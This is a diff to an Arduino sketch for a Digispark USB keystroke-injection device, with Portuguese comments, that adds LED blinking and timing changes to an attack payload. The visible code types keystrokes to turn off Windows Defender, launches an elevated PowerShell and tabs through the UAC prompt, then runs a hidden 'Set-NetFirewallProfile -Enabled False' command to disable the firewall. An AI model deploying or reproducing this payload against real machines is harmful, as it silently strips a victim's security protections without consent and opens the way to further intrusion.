@@ -1,10 +1,13 @@
 #include "DigiKeyboard.h"
+#include "DigiKeyboardPtBr.h"
 
 void setup() {
-  pinMode(1, HIGH);  //LED on Model A
+  pinMode(0,OUTPUT); 
+  pinMode(1,OUTPUT);     
 }
 
 void loop() {
+  pisca_led(100);
   //Desliga o Windows Defender
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);  //Minimiza todas as janelas abertas
@@ -34,10 +37,10 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);  //Fecha a janela
-  DigiKeyboard.delay(2000);
+  DigiKeyboard.delay(5000);
+    //Desabilita o Firewall
   DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);  //Abre o executar
   DigiKeyboard.delay(500);
-  //Desabilita o Firewall
   DigiKeyboard.println("powershell start-process powershell -verb runas");  
   DigiKeyboard.delay(2000);
   DigiKeyboard.print("\t");
@@ -45,7 +48,7 @@ void loop() {
   DigiKeyboard.print("\t");
   DigiKeyboard.delay(300);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(4000);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.println("powershell -windowstyle hidden Set-NetFirewallProfile -Enabled False");  //Desabilita o Firewall :)
   DigiKeyboard.delay(300);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -75,8 +78,17 @@ void loop() {
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   //
-  digitalWrite(1, HIGH);  //turn on led when program finishes
-  DigiKeyboard.delay(5000);
-  digitalWrite(1, LOW); // LED off <--> Action end
-  for(;;){ /*empty*/ }
+  pisca_led(1000); 
+  for(;;){ /*empty*/ } 
+}
+
+void pisca_led(int velocidade){  
+  for (int inicio =1; inicio <= 10; inicio ++) {
+    digitalWrite(0, HIGH); 
+    digitalWrite(1, HIGH); 
+    DigiKeyboardPtBr.delay(velocidade);  
+    digitalWrite(0, LOW); 
+    digitalWrite(1, LOW); 
+    DigiKeyboardPtBr.delay(velocidade);  
+  } 
 }
